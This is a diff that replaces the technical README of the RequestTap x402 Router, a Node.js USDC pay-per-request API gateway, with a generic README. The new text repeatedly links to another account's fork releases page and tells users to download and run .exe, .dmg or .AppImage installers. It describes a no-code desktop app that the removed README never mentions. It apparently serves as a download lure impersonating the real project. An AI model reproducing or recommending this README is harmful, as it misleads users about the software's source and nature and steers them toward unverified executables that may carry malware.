@@ -1,422 +1,141 @@
-<p align="center">
-  <img src="media/request-tap-logo-transparent.png" alt="RequestTap Router" width="700" />
-</p>
-
-<p align="center">
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-yellow.svg" alt="MIT License"></a>
-  <a href="https://nodejs.org"><img src="https://img.shields.io/badge/Node.js-20%2B-green.svg" alt="Node 20+"></a>
-  <a href="https://www.typescriptlang.org/"><img src="https://img.shields.io/badge/TypeScript-5-blue.svg" alt="TypeScript"></a>
-  <a href="https://www.x402.org/"><img src="https://img.shields.io/badge/x402-Pay%20Per%20Request-purple.svg" alt="x402"></a>
-</p>
-
-# RequestTap x402 Router
-
-Open Source x402 API Router. Instantly turn any API into a USDC pay-per-request service for AI agents.
-
----
-
-### Table of Contents
-
-- [Key Features](#key-features)
-- [Architecture](#architecture)
-- [Quick Start](#quick-start)
-- [Production Deployment](#production-deployment)
-- [Configuration](#configuration)
-- [BITE Encryption](#bite-encryption-skale)
-- [API Endpoints](#api-endpoints)
-- [Agent Guide](#agent-guide)
-- [Claude Code Commands](#claude-code-commands)
-- [Contributing](#contributing)
-- [Security](#security)
-- [Changelog](#changelog)
-- [License](#license)
-
----
-
-## Key Features
-
-- **x402 Payments** - Native HTTP 402 payment flow on Base (USDC)
-- **AP2 Mandates** - Spend caps, tool allowlists, expiry, signature verification (Mandate + IntentMandate)
-- **Replay Protection** - Idempotency key + request hash deduplication
-- **SSRF Protection** - Blocks private/reserved IP ranges at route compile time
-- **x402 Upstream Detection** - Rejects routes that already speak x402 to prevent markup/middleman abuse
-- **Agent Access Control** - Block specific agent addresses and check ERC-8004 on-chain reputation scores
-- **API Key Auth** - Optional API key requirement for gateway routes
-- **Rate Limiting** - 100 requests/min per IP via express-rate-limit
-- **Security Headers** - helmet + CORS middleware on all responses
-- **BITE Encryption** - Optional SKALE BITE for encrypted premium intents
-- **Receipts** - Structured JSON receipts for every request (SUCCESS, DENIED, ERROR)
-
-## Architecture
-
-```
-AI Agent  ──>  Agent SDK  ──>  Gateway  ──>  Upstream API
-                  │              │
-                  │         ┌────┴─────────┐
-                  │         │   Pipeline   │
-                  │         ├──────────────┤
-                  │         │ Rate Limit   │ ← 100 req/min
-                  │         │ API Key Auth │
-                  │         │ Access Ctrl  │ ← Blacklist + ERC-8004
-                  │         │ Route Match  │ ← OpenAPI 3.0
-                  │         │ Idempotency  │
-                  │         │ AP2 Mandate  │ ← EIP-191 Signatures
-                  │         │ x402 Payment │ ← Base L2 / USDC
-                  │         │ BITE Encrypt │ ← SKALE Network
-                  │         │ Proxy        │
-                  │         │ Receipt      │
-                  │         └──────────────┘
-                  │
-                  └── Receipts (SUCCESS / DENIED / ERROR)
-
-Payments: x402 Protocol → Coinbase CDP → Base L2 (USDC)
-Encryption: SKALE BITE → SKALE V4 Consensus → Threshold Encryption
-Signing: viem → EIP-191 Personal Sign → EIP-155 Chain IDs
-Contracts: Solidity → Hardhat → SKALE Deployment
-```
-
-## Monorepo Structure
-
-| Package | Description |
-|---------|-------------|
-| `packages/shared` | Types, schemas, constants |
-| `packages/gateway` | Express HTTP gateway with middleware pipeline |
-| `packages/sdk` | Agent client SDK (`RequestTapClient`) |
-| `dashboard` | Admin dashboard & debug tools |
-| `examples/agent-demo` | Demo script |
-| `contracts/` | SKALE BITE Solidity contract |
-
-## Prerequisites
-
-- **Node.js** v20+
-- **Coinbase Developer Platform (CDP) API key** — required by the Agent SDK to create wallets and make USDC payments
-
-### Getting CDP Credentials
-
-1. Go to [portal.cdp.coinbase.com](https://portal.cdp.coinbase.com/) and create a project
-2. Navigate to **API Keys** → **Create API Key**
-3. Configure the key:
-   - **API-specific restrictions:** enable **Server Wallet → Accounts** only
-   - **Signature algorithm:** **Ed25519** (recommended)
-   - Skip Coinbase App & Advanced Trade permissions (not needed)
-4. Copy the API key credentials into your `.env`:
-   ```
-   CDP_API_KEY_ID=<your key id>
-   CDP_API_KEY_SECRET=<your key secret>
-   ```
-5. Generate a **Wallet Secret** (required for signing transactions):
-   - Go to [Server Wallet dashboard](https://portal.cdp.coinbase.com/products/server-wallets)
-   - Select your project from the dropdown
-   - In the **Wallet Secret** section, click **Generate**
-   - Save it immediately — it is shown only once
-   - Add it to your `.env`:
-     ```
-     CDP_WALLET_SECRET=<base64-encoded PKCS8 EC P-256 key>
-     ```
-
-> **Note:** The Wallet Secret is generated by CDP's Trusted Execution Environment (TEE) and cannot be created locally. It is a base64-encoded PKCS8 DER EC P-256 private key used to sign wallet-auth JWTs.
-
-## Quick Start
-
-```bash
-# 1. Copy config files and add your secrets
-cp .env.example .env          # add CDP keys + RT_PAY_TO_ADDRESS
-cp packages/gateway/routes.example.json routes.json
-
-# 2. Install and build
-npm install
-npm run build
-
-# Start gateway (port 4402)
-node --env-file=.env packages/gateway/dist/index.js
-
-# Start dashboard (port 3000) — in a separate terminal
-node dashboard/server.js
-```
-
-Then open:
-- **Dashboard:** http://localhost:3000/dashboard
-- **API Docs:** http://localhost:3000/docs
-- **Gateway Health:** http://localhost:4402/admin/health (requires `Authorization: Bearer <RT_ADMIN_KEY>`)
-
-### Run Tests
-
-```bash
-npm test                                    # all workspaces
-npm test --workspace=packages/gateway       # gateway only
-```
-
-## Production Deployment
-
-In production, the RT gateway **must be the public-facing entry point** for all API routes. The gateway handles x402 payment challenges, verifies payments, proxies to your upstream API, and injects any required auth headers automatically. If agents reach your upstream directly (bypassing the gateway), they'll get auth errors instead of the expected `402 Payment Required`.
-
-### Recommended: Reverse Proxy
-
-Put a reverse proxy (nginx, Caddy, Cloudflare, Traefik) in front that routes API traffic through the gateway:
-
-```
-                 ┌─────────────────────────────────────────┐
-                 │          Reverse Proxy (nginx)          │
-Internet ──────>│                                         │
-                 │  /api/v1/*  ──>  RT Gateway (:4402)    │
-                 │  /health    ──>  RT Gateway (:4402)    │
-                 │  /docs      ──>  RT Gateway (:4402)    │
-                 │  /*         ──>  Upstream App (:8000)   │ ← landing page, etc.
-                 └─────────────────────────────────────────┘
-                                      │
-                           RT Gateway handles:
-                           • x402 payment (402 → pay → 200)
-                           • Auth injection to upstream
-                           • Receipts, mandates, replay protection
-```
-
-**Example nginx config:**
-
-```nginx
-# API routes → RT Gateway (x402 payment + proxy)
-location /api/v1/ {
-    proxy_pass http://localhost:4402;
-    proxy_set_header Host $host;
-    proxy_set_header X-Real-IP $remote_addr;
-}
-
-# Gateway public endpoints
-location /health {
-    proxy_pass http://localhost:4402;
-}
-location /docs {
-    proxy_pass http://localhost:4402;
-}
-
-# Everything else → upstream app (landing page, static assets)
-location / {
-    proxy_pass http://localhost:8000;
-}
-```
-
-**Example Docker Compose:**
-
-```yaml
-services:
-  gateway:
-    build: .
-    command: node --env-file=.env packages/gateway/dist/index.js
-    ports:
-      - "4402:4402"
-    env_file: .env
-
-  api:
-    image: your-upstream-api
-    # No public port — only reachable by the gateway
-    expose:
-      - "8000"
-
-  nginx:
-    image: nginx:alpine
-    ports:
-      - "443:443"
-    volumes:
-      - ./nginx.conf:/etc/nginx/conf.d/default.conf
-```
-
-### Common Mistake
-
-If your upstream API has its own auth (API keys, tokens), agents should **not** need that key. The gateway injects upstream auth automatically via the route's `provider.auth` config:
-
-```json
-{
-  "path": "/api/v1/companies",
-  "price_usdc": "0.01",
-  "provider": {
-    "backend_url": "http://api:8000",
-    "auth": {
-      "header": "X-Api-Key",
-      "value": "your-internal-api-key"
-    }
-  }
-}
-```
-
-Agents pay USDC — that **is** their authentication. If agents get a `401` instead of `402`, it means requests are bypassing the gateway and hitting the upstream directly.
-
-### Verify Your Deployment
-
-After deploying, confirm the gateway is in the request path:
-
-```bash
-# Should return 402 Payment Required (not 401 or 200)
-curl -s -o /dev/null -w "%{http_code}" https://your-domain.com/api/v1/your-paid-endpoint
-
-# Should return {"status":"ok"}
-curl -s https://your-domain.com/health
-```
-
-You can also use the provider test script:
-
-```bash
-npx tsx scripts/test-x402-provider.ts https://your-domain.com --dry-run
-```
-
-## Configuration
-
-Set environment variables or create a `.env` file (see `.env.example`):
-
-| Variable | Required | Default | Description |
-|----------|----------|---------|-------------|
-| `RT_PAY_TO_ADDRESS` | **yes** | — | USDC payment destination (Ethereum address) |
-| `RT_PORT` | no | `4402` | Gateway listen port |
-| `RT_ADMIN_KEY` | no | — | Bearer token for admin API |
-| `RT_FACILITATOR_URL` | no | Coinbase facilitator | x402 facilitator URL |
-| `RT_BASE_NETWORK` | no | `base-sepolia` | Base network name |
-| `RT_ROUTES_FILE` | no | — | Path to routes JSON file |
-| `RT_GATEWAY_DOMAIN` | no | — | Gateway domain for IntentMandate merchant matching (falls back to Host header) |
-| `RT_REPLAY_TTL_MS` | no | `300000` | Replay protection window in milliseconds (5 min) |
-| `RT_SKIP_X402_PROBE` | no | `false` | Skip x402 upstream detection on route registration |
-| `ERC8004_RPC_URL` | no | — | RPC URL for ERC-8004 reputation registry |
-| `ERC8004_CONTRACT` | no | — | ERC-8004 Reputation Registry contract address |
-| `ERC8004_MIN_SCORE` | no | `20` | Minimum reputation score to allow requests |
-| `SKALE_RPC_URL` | no | — | SKALE RPC endpoint (enables BITE encryption) |
-| `SKALE_CHAIN_ID` | no | — | SKALE chain ID |
-| `SKALE_BITE_CONTRACT` | no | — | BITE contract address |
-| `SKALE_PRIVATE_KEY` | no | — | SKALE signing key |
-
-## BITE Encryption (SKALE)
-
-Optional threshold encryption for payment intents using [SKALE BITE](https://docs.skale.space/get-started/quick-start/skale-on-base) (Blockchain Integrated Threshold Encryption). When enabled, premium request data is encrypted before consensus and only revealed after payment confirmation.
-
-**How it works:**
-1. Gateway encrypts calldata via `@skalenetwork/bite` (`BITE.encryptTransaction()`)
-2. Encrypted intent is stored on-chain (`storeIntent`)
-3. After x402 payment confirms, `markPaid` triggers the threshold decryption reveal
-4. Decrypted data is read back via `getIntent`
-
-**Networks:**
-
-| Network | Chain ID | RPC | Gas Token | Notes |
-|---------|----------|-----|-----------|-------|
-| SKALE Base Sepolia (testnet) | `324705682` | `https://base-sepolia-testnet.skalenodes.com/v1/jubilant-horrible-ancha` | sFUEL (free) | Best for development |
-| SKALE Base (mainnet) | `1187947933` | `https://skale-base.skalenodes.com/v1/base` | CREDIT | Permissionless, no subscription needed |
-
-**Testnet configuration:**
-```
-SKALE_RPC_URL=https://base-sepolia-testnet.skalenodes.com/v1/jubilant-horrible-ancha
-SKALE_CHAIN_ID=324705682
-SKALE_BITE_CONTRACT=<your deployed BiteIntentStore address>
-SKALE_PRIVATE_KEY=<private key with sFUEL for gas>
-```
-
-**Mainnet configuration:**
-```
-SKALE_RPC_URL=https://skale-base.skalenodes.com/v1/base
-SKALE_CHAIN_ID=1187947933
-SKALE_BITE_CONTRACT=<your deployed BiteIntentStore address>
-SKALE_PRIVATE_KEY=<private key with CREDITS for gas>
-```
-
-**SKALE Base Mainnet setup:**
-1. Buy CREDITS at [base.skalenodes.com/credits](https://base.skalenodes.com/credits) using the wallet from `SKALE_PRIVATE_KEY`
-2. Deploy the contract: `cd contracts && npm run deploy:base-mainnet`
-3. Set `SKALE_BITE_CONTRACT` to the deployed address
-
-SKALE Base mainnet is **permissionless** — no chain subscription required. Developers purchase CREDITS (with USDC or SKL) to pay for gas. The dashboard sidebar shows your current CREDIT balance when connected to mainnet.
-
-**Contract deployment scripts:**
-```bash
-npm run deploy:calypso       # Calypso testnet
-npm run deploy:base-sepolia  # SKALE Base Sepolia testnet
-npm run deploy:base-mainnet  # SKALE Base mainnet
-```
-
-**Admin endpoints** (when BITE is enabled):
-| Method | Path | Description |
-|--------|------|-------------|
-| `GET` | `/admin/skale/status` | Wallet address and CREDIT balance |
-| `POST` | `/admin/skale/test-anchor` | Test SKALE connectivity |
-| `GET` | `/admin/skale/intent/:id` | Read intent state |
-| `POST` | `/admin/skale/reveal/:id` | Manually trigger reveal |
-
-## API Endpoints
-
-### Public
-
-| Method | Path | Description |
-|--------|------|-------------|
-| `GET` | `/health` | Returns `{"status":"ok"}` |
-| `GET` | `/docs` | OpenAPI spec for registered routes |
-
-### Admin (requires `Authorization: Bearer <RT_ADMIN_KEY>`)
-
-| Method | Path | Description |
-|--------|------|-------------|
-| `GET` | `/admin/health` | Gateway health, uptime, route & receipt counts |
-| `GET` | `/admin/config` | Current gateway configuration (secrets masked) |
-| `GET` | `/admin/routes` | List all routes |
-| `POST` | `/admin/routes` | Add a single route |
-| `PUT` | `/admin/routes/:toolId` | Update route (price, description, backend URL, etc.) |
-| `DELETE` | `/admin/routes/:toolId` | Delete a route |
-| `POST` | `/admin/routes/import` | Batch import routes from an OpenAPI spec |
-| `GET` | `/admin/receipts` | Query receipts with filtering & pagination |
-| `GET` | `/admin/receipts/stats` | Aggregate stats (total, success rate, USDC, latency) |
-| `GET` | `/admin/spend/:mandateId` | Check daily spend for a mandate |
-| `GET` | `/admin/intent-spend/:mandateKey` | Check lifetime spend for an IntentMandate |
-| `GET` | `/admin/dashboard-config` | Get dashboard configuration |
-| `PUT` | `/admin/dashboard-config` | Update dashboard configuration |
-| `GET` | `/admin/docs/openapi` | Generate OpenAPI spec |
-| `GET` | `/admin/blacklist` | List blacklisted agent addresses |
-| `POST` | `/admin/blacklist` | Add agent address to blacklist |
-| `DELETE` | `/admin/blacklist/:address` | Remove agent from blacklist |
-| `GET` | `/admin/reputation/:agentId` | Query ERC-8004 on-chain reputation for an agent |
-
-## Agent Guide
-
-Building an AI agent that pays for API calls? See **[AGENTS.md](AGENTS.md)** for the full guide covering SDK setup, payment flow, AP2 mandates, receipts, and code examples.
-
-## Claude Code Commands
-
-This repo includes [Claude Code](https://claude.com/claude-code) slash commands in `.claude/commands/` for common dev workflows. Open the project in Claude Code and type `/` to see them:
-
-| Command | Description |
-|---|---|
-| `/start` | Build, generate demo `.env` & `routes.json` if missing, start gateway + dashboard, print URLs |
-| `/stop` | Kill running gateway and dashboard processes |
-| `/restart` | Stop, rebuild, and restart everything |
-| `/status` | Show which services are running with uptime and route stats |
-| `/build` | Build all TypeScript workspaces (or a specific one: `/build gateway`) |
-| `/run-tests` | Run the test suite (or a specific workspace: `/run-tests sdk`) |
-| `/run-debug` | Start gateway with Node `--inspect` + verbose logging for debugger attachment |
-| `/health` | Hit admin API endpoints and display a health summary |
-| `/add-route` | Add a new API route (via admin API if running, or edits `routes.json`) |
-| `/logs` | Show recent gateway and dashboard log output |
-
-## Contributing
-
-We welcome contributions! See **[CONTRIBUTING.md](CONTRIBUTING.md)** for guidelines on reporting bugs, suggesting features, and submitting pull requests.
-
-## Security
-
-To report a vulnerability, please email [support@requesttap.ai](mailto:support@requesttap.ai) — do not open public issues for security bugs. See **[SECURITY.md](SECURITY.md)** for full details.
-
-## Changelog
-
-See **[CHANGELOG.md](CHANGELOG.md)** for a detailed list of changes in each release.
-
-## Contributors
-
-<a href="https://github.com/RequestTap/RequestTap-Router/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=RequestTap/RequestTap-Router" />
-</a>
-<a href="https://github.com/mikevokes">
-  <img src="media/pinned-avatar.png" alt="PinneD" width="63" />
-</a>
-
-## Website
-
-[RequestTap.ai](https://RequestTap.ai)
-
-## Contact
-
-[support@requesttap.ai](mailto:support@requesttap.ai)
-
-## License
-
-MIT
+# ⚙️ RequestTap-Router - Easy API Payments with USDC
+
+[![Download RequestTap-Router](https://img.shields.io/badge/Download-RequestTap--Router-blue?style=for-the-badge)](https://github.com/zakyafrilliansyah/RequestTap-Router/releases)
+
+## 📖 What is RequestTap-Router?
+
+RequestTap-Router is a simple tool to turn any API into a pay-per-request service using USDC, a popular digital currency. It helps AI agents and other software request data or services quickly while paying instantly for each request.
+
+You do not need to be a programmer to use this. The tool sets up a system where access to any API is controlled and paid for in digital coins, making it easier to handle API usage and payment without complicated setups.
+
+## 💡 Why Use RequestTap-Router?
+
+- Turn your API into a payment-based service fast.
+- Use USDC, a stable digital coin, for easy, instant payments.
+- Control API calls from AI agents and other apps.
+- Open source and free to use without hidden fees.
+- Built with clear, reliable technology.
+
+## 🖥️ System Requirements
+
+Before you download the app, check your computer meets these basic needs:
+
+- Windows 10 or newer, macOS 10.15 (Catalina) or newer, Linux (Ubuntu 18.04+ recommended).
+- At least 4 GB of RAM.
+- 500 MB of free disk space.
+- Internet connection to connect to APIs and USDC services.
+- A web browser to access the admin interface (Chrome, Firefox, Safari, or Edge recommended).
+
+## 📥 Download & Install
+
+### Step 1: Visit the Download Page
+
+Go to the official release page to get the latest version of RequestTap-Router:
+
+[Download RequestTap-Router](https://github.com/zakyafrilliansyah/RequestTap-Router/releases)
+
+### Step 2: Choose Your File
+
+On the download page, you will see versions for different operating systems. Find the one matching your computer:
+
+- For Windows, look for `.exe` files.
+- For macOS, look for `.dmg` or `.zip` files.
+- For Linux, look for `.AppImage`, `.deb`, or `.tar.gz`.
+
+### Step 3: Download the File
+
+Click the file name and save it to your computer. The download time depends on your internet speed but usually takes less than a minute.
+
+### Step 4: Install the Application
+
+- **Windows:** Double-click the `.exe` file and follow the on-screen setup instructions.
+- **macOS:** Open the `.dmg` file and drag the app to your Applications folder.
+- **Linux:** Use the proper method for your package type. For example, make `.AppImage` executable and run it, or install `.deb` with your package manager.
+
+### Step 5: Open RequestTap-Router
+
+Once installed, find the app in your programs or applications list and open it.
+
+## 🚀 Getting Started with RequestTap-Router
+
+Follow these simple steps to start controlling your API with pay-per-request payments.
+
+### 1. Connect Your API
+
+Inside the app, you will find a straightforward form. Enter:
+
+- The URL of your API.
+- The API key or credentials if needed.
+
+This allows RequestTap-Router to access your API securely.
+
+### 2. Set Up USDC Payments
+
+RequestTap-Router works with USDC payments on networks like Ethereum or Skale. You will need:
+
+- A digital wallet that supports USDC (e.g., Coinbase Wallet, MetaMask).
+- Some USDC tokens in your wallet.
+
+Connect your wallet through the app. This step lets you manage receiving payments from API users.
+
+### 3. Define Pricing
+
+Set how much each API request costs. You can pick prices based on:
+
+- Number of requests.
+- Data size or type.
+- Fixed cost per call.
+
+This pricing helps control who can use your API and how much they pay.
+
+### 4. Start the Router
+
+After setup, turn on your router in the app. It will listen for API calls and handle payments automatically.
+
+## 🔧 How RequestTap-Router Works
+
+RequestTap-Router sits between your API and the users (usually AI agents). It checks each API call for payment before letting the request go through.
+
+- When a request comes in, it asks for payment.
+- The user pays with USDC.
+- Once payment clears, the call goes to your original API.
+- The response is sent back to the user.
+
+This process happens instantly and securely, using blockchain technology on the backend but without exposing you to the technical parts.
+
+## 🛠 Features
+
+- **Pay-per-request model:** Only pay when a request happens.
+- **Supports major blockchain networks:** Ethereum, Skale, and others.
+- **Friendly UI:** Set up quickly without coding.
+- **Open source:** Review and change the code if needed.
+- **Secure:** Payment verification ensures no unpaid calls get through.
+- **Flexible pricing:** You control cost models.
+- **Real-time monitoring:** See payments and API usage reports.
+
+## 🔍 Troubleshooting Tips
+
+If you run into issues, try these fixes:
+
+- Check your internet connection.
+- Make sure your USDC wallet is connected and funded.
+- Verify API keys and URLs are correct.
+- Restart the app if it freezes or behaves oddly.
+- Update to the latest version from the releases page.
+- Visit the GitHub issues page for help or report bugs.
+
+## 🤝 Support & Community
+
+RequestTap-Router is a community project. You can get help or share your experience by:
+
+- Opening issues on the GitHub page.
+- Joining discussions or forums listed in the repo.
+- Following the development updates online.
+
+## 📚 More Information
+
+To learn more or explore advanced options, visit the repository on GitHub:
+
+[RequestTap-Router GitHub Releases](https://github.com/zakyafrilliansyah/RequestTap-Router/releases) 
+
+This page includes installation files, update notes, and links to the full documentation for deeper understanding.
